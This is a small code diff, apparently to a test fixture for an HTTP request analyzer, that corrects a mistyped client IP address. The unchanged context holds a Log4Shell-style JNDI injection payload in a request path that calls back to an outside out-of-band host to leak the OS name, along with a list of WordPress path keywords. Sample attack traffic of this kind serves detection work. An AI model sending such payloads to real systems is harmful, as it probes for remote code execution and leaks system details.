@@ -54,7 +54,7 @@ instance = httpanalyzer.Request(
      'Connection': 'keep-alive',
      'Host': '127.0.0.1:80',
      'User-Agent': 'curl/7.82.0'},
-    '159.223.2g05.51',
+    '159.223.205.51',
     '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
     ['wp-content', 'wp-config', 'wp-includes']
 )
